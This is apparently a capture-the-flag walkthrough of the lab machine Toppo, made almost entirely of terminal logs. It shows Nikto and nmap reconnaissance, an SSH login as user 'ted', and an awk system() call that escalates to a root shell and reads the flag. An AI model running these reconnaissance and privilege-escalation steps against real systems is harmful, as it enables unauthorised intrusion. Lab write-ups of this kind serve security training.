
### Use Nikto to scan the website - nikto -h [IP]




```
root@hal:~# nikto -h 192.168.57.3
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.57.3
+ Target Hostname:    192.168.57.3
+ Target Port:        80
+ Start Time:         2019-01-10 15:01:39 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2019-01-10 15:01:48 (GMT5.5) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
*****

### Use nmap scan in order to view the open ports on this machine.
> Parameters 

     -v - verbose output
    -sS - TCP-SYN scan
    -A - OS detection, version detection and traceroute
    -T4 - aggresive scan
    -p- - scan all 65535 ports

```
root@hal:~# nmap -v -sS -A -T4 -p- 192.168.57.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-10 14:54 IST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Initiating ARP Ping Scan at 14:54
Scanning 192.168.57.3 [1 port]
Completed ARP Ping Scan at 14:54, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:54
Completed Parallel DNS resolution of 1 host. at 14:54, 0.00s elapsed
Initiating SYN Stealth Scan at 14:54
Scanning 192.168.57.3 [65535 ports]
Discovered open port 22/tcp on 192.168.57.3
Discovered open port 80/tcp on 192.168.57.3
Discovered open port 111/tcp on 192.168.57.3
Discovered open port 43389/tcp on 192.168.57.3
Completed SYN Stealth Scan at 14:54, 2.16s elapsed (65535 total ports)
Initiating Service scan at 14:54
Scanning 4 services on 192.168.57.3
Completed Service scan at 14:54, 11.01s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.57.3
NSE: Script scanning 192.168.57.3.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.51s elapsed
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Nmap scan report for 192.168.57.3
Host is up (0.00046s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
53/tcp    filtered domain
80/tcp    open     http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open     rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          43389/tcp  status
|_  100024  1          46855/udp  status
43389/tcp open     status  1 (RPC #100024)
MAC Address: 08:00:27:04:A2:14 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.840 days (since Mon Jun 25 18:45:01 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.57.3

NSE: Script Post-scanning.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.22 seconds
           Raw packets sent: 65559 (2.885MB) | Rcvd: 65549 (2.623MB)

```
****
```
root@hal:~# ssh ted@192.168.57.3
The authenticity of host '192.168.57.3 (192.168.57.3)' can't be established.
ECDSA key fingerprint is SHA256:+i9tqbQwK978CB+XRr02pS6QPd3evJ+lueOkK1LTtU0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.57.3' (ECDSA) to the list of known hosts.
ted@192.168.57.3's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
ted@Toppo:~$ ls -la
total 24
drwxr-xr-x 2 ted  ted  4096 Apr 15  2018 .
drwxr-xr-x 3 root root 4096 Apr 15  2018 ..
-rw------- 1 ted  ted     1 Apr 15  2018 .bash_history
-rw-r--r-- 1 ted  ted   220 Apr 15  2018 .bash_logout
-rw-r--r-- 1 ted  ted  3515 Apr 15  2018 .bashrc
-rw-r--r-- 1 ted  ted   675 Apr 15  2018 .profile
ted@Toppo:~$ cat /etc/sudoers
ted ALL=(ALL) NOPASSWD: /usr/bin/awk

ted@Toppo:~$ which nc
/bin/nc
ted@Toppo:~$ awk 'BEGIN {system("whoami")}'
root
ted@Toppo:~$ cd /root/
-bash: cd: /root/: Permission denied
ted@Toppo:~$ sudo -l -l
-bash: sudo: command not found
ted@Toppo:~$ awk 'BEGIN {system("/bin/sh")}'
# root
/bin/sh: 1: root: not found
# ls
# 
# cd /root/
# ls
flag.txt
# cat flag.txt
_________                                  
|  _   _  |                                 
|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
   _| |_ | \__. | | \__/ | | \__/ || \__. | 
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
                 [__|     [__|              




Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
# 
```
